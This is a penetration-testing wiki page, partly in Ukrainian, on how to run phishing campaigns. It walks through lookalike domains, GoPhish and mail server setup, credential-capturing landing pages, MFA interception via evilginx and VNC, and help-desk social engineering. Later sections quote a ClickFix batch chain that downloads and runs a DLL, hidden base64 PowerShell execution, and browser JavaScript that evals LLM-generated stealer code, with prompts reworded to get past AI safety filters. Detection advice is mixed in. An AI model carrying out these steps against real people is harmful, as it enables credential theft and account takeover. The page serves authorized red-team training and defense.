# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon the victim
1. Select the **victim domain**.
2. Perform some basic web enumeration **searching for login portals** used by the victim and **decide** which one you will **impersonate**.
3. Use some **OSINT** to **find emails**.
2. Prepare the environment
1. **Buy the domain** you are going to use for the phishing assessment
2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
3. Configure the VPS with **gophish**
3. Prepare the campaign
1. Prepare the **email template**
2. Prepare the **web page** to steal the credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: The domain name **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).
- **New TLD**: Same domain using a **new TLD** (e.g., zelster.org)
- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** It **swaps two letters** within the domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Adds or removes “s” at the end of the domain name (e.g., zeltsers.com).
- **Omission**: It **removes one** of the letters from the domain name (e.g., zelser.com).
- **Repetition:** It **repeats one** of the letters in the domain name (e.g., zeltsser.com).
- **Replacement**: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).
- **Subdomained**: Introduce a **dot** inside the domain name (e.g., ze.lster.com).
- **Insertion**: It **inserts a letter** into the domain name (e.g., zerltser.com).
- **Missing dot**: Append the TLD to the domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

There is a **possibility that one of some bits stored or in communication might get automatically flipped** due to various factors like solar flares, cosmic rays, or hardware errors.

When this concept is **applied to DNS requests**, it is possible that the **domain received by the DNS server** is not the same as the domain initially requested.

For example, a single bit modification in the domain "windows.com" can change it to "windnws.com."

Attackers may **take advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention is to redirect legitimate users to their own infrastructure.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

You can search in [https://www.expireddomains.net/](https://www.expireddomains.net) for a expired domain that you could use.\
In order to make sure that the expired domain that you are going to buy **has already a good SEO** you could search how is it categorized in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

In order to **discover more** valid email addresses or **verify the ones** you have already discovered you can check if you can brute-force them smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moreover, don't forget that if the users use **any web portal to access their mails**, you can check if it's vulnerable to **username brute force**, and exploit the vulnerability if possible.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Конфігурація

**Конфігурація TLS certificate**

Перед цим кроком ви вже повинні були **придбати домен**, який збираєтеся використовувати, і він має бути **спрямований** на **IP VPS**, на якому ви налаштовуєте **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

Почніть з встановлення: `apt-get install postfix`

Потім додайте домен до таких файлів:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Також змініть значення таких змінних всередині /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Нарешті, змініть файли **`/etc/hostname`** і **`/etc/mailname`** на назву вашого домену та **перезапустіть ваш VPS.**

Тепер створіть **DNS A record** для `mail.<domain>`, що вказує на **ip address** VPS, і **DNS MX** record, що вказує на `mail.<domain>`

Тепер давайте перевіримо надсилання email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Конфігурація Gophish**

Зупиніть виконання gophish і налаштуємо його.\
Змініть `/opt/gophish/config.json` на таке (зверніть увагу на використання https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Налаштуйте службу gophish**

Щоб створити службу gophish, щоб її можна було запускати автоматично та керувати нею як службою, можна створити файл `/etc/init.d/gophish` з таким вмістом:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Завершіть налаштування service та перевірте його, виконавши:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Налаштування mail server and domain

### Wait & be legit

Чим старіший domain, тим менша ймовірність, що його буде позначено як spam. Тому слід зачекати якомога довше (щонайменше 1 week) перед phishing assessment. moreover, якщо ви розмістите сторінку про reputational sector, отримана репутація буде кращою.

Зверніть увагу, що навіть якщо вам доведеться чекати тиждень, ви можете завершити налаштування всього зараз.

### Configure Reverse DNS (rDNS) record

Встановіть rDNS (PTR) record, який розв’язує IP address VPS у domain name.

### Sender Policy Framework (SPF) Record

Ви повинні **configure a SPF record для нового domain**. Якщо ви не знаєте, що таке SPF record, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Ви можете використати [https://www.spfwizard.net/](https://www.spfwizard.net) для генерації вашої SPF policy (використайте IP VPS machine)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

This is the content that must be set inside a TXT record inside the domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Вам потрібно **налаштувати DMARC record для нового domain**. Якщо ви не знаєте, що таке DMARC record, [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Вам потрібно створити новий DNS TXT record, що вказує на hostname `_dmarc.<domain>` з таким вмістом:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Ви повинні **налаштувати DKIM для нового домену**. Якщо ви не знаєте, що таке запис DMARC [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Цей підручник базується на: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Вам потрібно об’єднати обидва значення B64, які генерує DKIM key:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Перевірте свій бал конфігурації email

Ви можете зробити це за допомогою [https://www.mail-tester.com/](https://www.mail-tester.com)\
Просто відкрийте сторінку та надішліть email на адресу, яку вони вам нададуть:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ви також можете **перевірити конфігурацію вашої пошти**, надіславши email на `check-auth@verifier.port25.com` і **прочитавши відповідь** (для цього вам потрібно буде **відкрити** порт **25** і переглянути відповідь у файлі _/var/mail/root_, якщо ви надішлете email як root).\
Перевірте, що ви проходите всі тести:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ви також можете надіслати **message на Gmail, який ви контролюєте**, і перевірити **заголовки email** у вашій Gmail inbox, `dkim=pass` має бути присутнім у полі заголовка `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Видалення зі Blacklist Spamhouse

Сторінка [www.mail-tester.com](https://www.mail-tester.com) може показати вам, чи ваш домен блокується spamhouse. Ви можете подати запит на видалення вашого домену/IP за адресою: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Видалення з Blacklist Microsoft

​​Ви можете подати запит на видалення вашого домену/IP за адресою [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Вкажіть деяке **ім'я для ідентифікації** профілю відправника
- Вирішіть, з якого облікового запису ви будете надсилати phishing emails. Suggestions: _noreply, support, servicedesk, salesforce..._
- Ви можете залишити порожніми username і password, але обов'язково поставте прапорець Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Рекомендується використовувати функцію "**Send Test Email**", щоб перевірити, що все працює.\
> Я б рекомендував **надсилати тестові листи на 10min mails addresses**, щоб уникнути потрапляння в blacklist під час тестів.

### Email Template

- Вкажіть деяке **ім'я для ідентифікації** шаблону
- Потім напишіть **subject** (нічого дивного, просто щось, що ви могли б очікувати побачити в звичайному email)
- Переконайтеся, що ви поставили прапорець "**Add Tracking Image**"
- Напишіть **email template** (ви можете використовувати змінні, як у наведеному нижче прикладі):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **щоб підвищити довіру до email**, рекомендується використати якийсь signature з email клієнта. Пропозиції:

- Надішліть email на **неіснуючу адресу** і перевірте, чи є у відповіді signature.
- Пошукайте **public emails** на кшталт info@ex.com або press@ex.com чи public@ex.com і надішліть їм email та дочекайтеся відповіді.
- Спробуйте зв’язатися з **якимось валідним знайденим** email і дочекайтеся відповіді

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template також дозволяє **attach files to send**. Якщо ви також хочете вкрасти NTLM challenges за допомогою спеціально створених файлів/документів, [прочитайте цю сторінку](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Вкажіть **name**
- **Напишіть HTML code** веб-сторінки. Зверніть увагу, що ви можете **import** веб-сторінки.
- Позначте **Capture Submitted Data** і **Capture Passwords**
- Встановіть **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Зазвичай вам потрібно буде змінити HTML code сторінки та провести кілька тестів локально (можливо, використовуючи якийсь Apache server) **поки вас не влаштує результат.** Потім вставте цей HTML code у поле.\
> Зверніть увагу, що якщо вам потрібно **use some static resources** для HTML (можливо, деякі CSS і JS pages), ви можете зберегти їх у _**/opt/gophish/static/endpoint**_ і потім отримувати до них доступ через _**/static/\<filename>**_

> [!TIP]
> Для redirection ви можете **redirect the users to the legit main web page** жертви, або, наприклад, перенаправити їх на _/static/migration.html_, вставити якийсь **spinning wheel (**[**https://loading.io/**](https://loading.io)**) на 5 секунд і потім вказати, що процес успішний**.

### Users & Groups

- Встановіть name
- **Import the data** (зверніть увагу, що для використання шаблону з прикладу вам потрібні firstname, last name і email address кожного користувача)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Нарешті, створіть campaign, вибравши name, email template, landing page, URL, sending profile і group. Зверніть увагу, що URL буде лінком, надісланим жертвам

Зверніть увагу, що **Sending Profile allow to send a test email to see how will the final phishing email looks like**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Я б рекомендував **send the test emails to 10min mails addresses** щоб уникнути blacklist під час тестів.

Коли все буде готово, просто запустіть campaign!

## Website Cloning

Якщо з якоїсь причини ви хочете клонувати website, перевірте наступну сторінку:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

У деяких phishing assessments (переважно для Red Teams) ви також захочете **send files containing some kind of backdoor** (можливо, C2 або просто щось, що тригерне authentication).\
Перевірте наступну сторінку для прикладів:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Попередня атака дуже хитра, оскільки ви підробляєте real website і збираєте інформацію, введену користувачем. На жаль, якщо користувач не ввів правильний password або якщо application, яку ви підробили, налаштовано з 2FA, **ця інформація не дозволить вам видати себе за обманутого користувача**.

Саме тут корисні tools на кшталт [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) і [**muraena**](https://github.com/muraenateam/muraena). Цей tool дозволить вам згенерувати MitM like attack. По суті, атака працює так:

1. Ви **impersonate the login** form реальної webpage.
2. Користувач **send** свої **credentials** на вашу фейкову page, а tool надсилає їх на реальну webpage, **перевіряючи, чи працюють credentials**.
3. Якщо account налаштовано з **2FA**, MitM page запросить його, і після того як **user introduces** його, tool надішле це на реальну web page.
4. Після того як користувача автентифіковано, ви (як attacker) матимете **captured the credentials, the 2FA, the cookie and any information** про кожну взаємодію, поки tool виконує MitM.

### Via VNC

Що, якщо замість **sending the victim to a malicious page** з таким самим виглядом, як у оригінальної, ви відправите його в **VNC session with a browser connected to the real web page**? Ви зможете бачити, що він робить, вкрасти password, MFA, що використовується, cookies...\
Ви можете зробити це за допомогою [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Очевидно, один із найкращих способів дізнатися, чи вас викрили, — це **search your domain inside blacklists**. Якщо він з’являється в списку, отже, somehow ваш domain був визначений як suspicions.\
Один простий спосіб перевірити, чи ваш domain є в будь-якому blacklist, — скористатися [https://malwareworld.com/](https://malwareworld.com)

Однак існують інші способи дізнатися, чи жертва **actively looking for suspicions phishing activity in the wild**, як пояснено в:


{{#ref}}
detecting-phising.md
{{#endref}}

Ви можете **buy a domain with a very similar name** до victims domain **and/or generate a certificate** для **subdomain** домену, яким ви керуєте, **containing** **keyword** домену жертви. Якщо **victim** виконає будь-яку **DNS or HTTP interaction** з ними, ви знатимете, що **he is actively looking** for suspicious domains, і вам потрібно буде бути дуже stealth.

### Evaluate the phishing

Використовуйте [**Phishious** ](https://github.com/Rices/Phishious), щоб оцінити, чи ваш email потрапить у spam folder, чи буде blocked, чи успішним.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Сучасні intrusion sets дедалі частіше пропускають email lures повністю і **directly target the service-desk / identity-recovery workflow** для обходу MFA. Атака повністю "living-off-the-land": щойно operator отримує valid credentials, він переходить, використовуючи вбудовані admin tooling – malware не потрібен.

### Attack flow
1. Recon the victim
* Зберіть особисті й корпоративні дані з LinkedIn, data breaches, public GitHub тощо.
* Визначте high-value identities (executives, IT, finance) і з’ясуйте **exact help-desk process** для password / MFA reset.
2. Real-time social engineering
* Подзвоніть, через Teams або chat до help-desk, видаючи себе за target (часто з **spoofed caller-ID** або **cloned voice**).
* Надайте раніше зібрані PII, щоб пройти knowledge-based verification.
* Переконайте agent **reset the MFA secret** або виконати **SIM-swap** на зареєстрований mobile number.
3. Immediate post-access actions (≤60 min in real cases)
* Закріпіться через будь-який web SSO portal.
* Перелічіть AD / AzureAD за допомогою вбудованих засобів (без запуску binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement за допомогою **WMI**, **PsExec** або legitimate **RMM** agents, які вже whitelisted у середовищі.

### Detection & Mitigation
* Ставтеся до help-desk identity recovery як до **privileged operation** – вимагайте step-up auth і approval керівника.
* Розгорніть правила **Identity Threat Detection & Response (ITDR)** / **UEBA**, які сповіщають про:
* MFA method changed + authentication from new device / geo.
* Негайне підвищення привілеїв того самого principal (user-→-admin).
* Записуйте help-desk calls і вимагайте **call-back to an already-registered number** перед будь-яким reset.
* Впровадьте **Just-In-Time (JIT) / Privileged Access**, щоб щойно скинуті accounts не успадковували high-privilege tokens автоматично.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews компенсують вартість high-touch ops масовими атаками, що перетворюють **search engines & ad networks into the delivery channel**.

1. **SEO poisoning / malvertising** просуває фейковий результат на кшталт `chromium-update[.]site` на верхні позиції search ads.
2. Жертва завантажує невеликий **first-stage loader** (часто JS/HTA/ISO). Приклади, які бачила Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader exfiltrates browser cookies + credential DBs, а потім підтягує **silent loader**, який вирішує – *in realtime* – що розгортати:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Блокуйте newly-registered domains і застосовуйте **Advanced DNS / URL Filtering** до *search-ads* так само, як і до email.
* Обмежте встановлення software лише підписаними MSI / Store packages, забороніть виконання `HTA`, `ISO`, `VBS` політикою.
* Моніторте дочірні processes браузерів, що відкривають installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Полюйте на LOLBins, які часто зловживаються first-stage loaders (наприклад `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: cloned national CERT advisory з кнопкою **Update**, яка показує покрокові інструкції "fix". Жертвам кажуть запустити batch, що завантажує DLL і виконує її через `rundll32`.
* Типовий batch chain, який спостерігали:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` скидає payload у `%TEMP%`, коротка пауза приховує network jitter, потім `rundll32` викликає експортовану entrypoint (`notepad`).
* DLL beacon host identity і опитує C2 кожні кілька хвилин. Віддалене tasking надходить як **base64-encoded PowerShell**, який виконується приховано й з bypass policy:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Це зберігає гнучкість C2 (server може змінювати tasks без оновлення DLL) і ховає console windows. Полюйте на PowerShell children of `rundll32.exe`, використовуючи `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` разом.
* Defenders можуть шукати HTTP(S) callbacks форми `...page.php?tynor=<COMPUTER>sss<USER>` і 5-minute polling intervals після завантаження DLL.

---

## AI-Enhanced Phishing Operations
Attackers тепер поєднують **LLM & voice-clone APIs** для повністю персоналізованих lures і взаємодії в реальному часі.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Додавайте **dynamic banners**, що підсвічують messages, надіслані з untrusted automation (через ARC/DKIM anomalies).
• Розгорніть **voice-biometric challenge phrases** для high-risk phone requests.
• Безперервно симулюйте AI-generated lures у awareness programmes – static templates застаріли.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers can ship benign-looking HTML and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g., `eval` or dynamic `<script>`).

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in the prompt; iterate wording to bypass safety filters and reduce hallucinations.
2. **Client-side API call:** on load, JS calls a public LLM (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.
3. **Assemble & exec:** concatenate the response and execute it (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** згенерований code персоналізує lure (наприклад, LogoKit token parsing) і надсилає creds на prompt-hidden endpoint.

**Evasion traits**
- Traffic іде на well-known LLM domains або reputable CDN proxies; інколи через WebSockets до backend.
- Немає static payload; malicious JS існує лише після render.
- Non-deterministic generations створюють **unique** stealers для кожної session.

**Detection ideas**
- Запускайте sandboxes з увімкненим JS; відмічайте **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Шукайте front-end POSTs до LLM APIs, після яких одразу йдуть `eval`/`Function` на returned text.
- Сповіщайте про unsanctioned LLM domains у client traffic, а також подальші credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Окрім classic push-bombing, operators просто **force a new MFA registration** під час help-desk call, анулюючи existing token користувача. Будь-який наступний login prompt виглядає легітимним для victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Слідкуйте за подіями AzureAD/AWS/Okta, де **`deleteMFA` + `addMFA`** відбуваються **протягом кількох хвилин з тієї самої IP**.



## Clipboard Hijacking / Pastejacking

Зловмисники можуть непомітно копіювати шкідливі команди в буфер обміну жертви з скомпрометованої або typosquatted веб-сторінки, а потім обманом змусити користувача вставити їх у **Win + R**, **Win + X** або вікно terminal, виконуючи довільний code без будь-якого download чи attachment.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Сторінка-приманка (наприклад, фальшивий канал ministry/CERT) показує WhatsApp Web/Desktop QR і наказує жертві відсканувати його, непомітно додаючи атакувальника як **linked device**.
* Атакувальник негайно отримує доступ до чатів/контактів, доки сесію не буде видалено. Пізніше жертва може побачити сповіщення про “new device linked”; захисники можуть шукати несподівані події device-link незабаром після відвідування ненадійних QR-сторінок.

### Mobile‑gated phishing to evade crawlers/sandboxes
Оператори дедалі частіше ставлять свої phishing-потоки за просту device check, щоб desktop crawlers ніколи не доходили до фінальних сторінок. Поширений шаблон — невеликий script, який перевіряє наявність touch-capable DOM і надсилає результат на server endpoint; не‑mobile clients отримують HTTP 500 (або порожню сторінку), тоді як mobile users бачать повний flow.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` логіка (спрощено):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Поведінка сервера, яку часто спостерігають:
- Встановлює session cookie під час першого завантаження.
- Приймає `POST /detect {"is_mobile":true|false}`.
- Повертає 500 (або placeholder) для наступних GET, коли `is_mobile=false`; показує phishing лише якщо `true`.

Ознаки для пошуку та виявлення:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: послідовність `GET /static/detect_device.js` → `POST /detect` → HTTP 500 для non‑mobile; легітимні шляхи для mobile-жертви повертають 200 із подальшим HTML/JS.
- Блокуйте або перевіряйте сторінки, які умовно показують content виключно на основі `ontouchstart` або подібних перевірок пристрою.

Поради з захисту:
- Запускайте crawlers з mobile‑like fingerprints і увімкненим JS, щоб виявляти gated content.
- Сигналізуйте про підозрілі відповіді 500 після `POST /detect` на newly registered domains.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
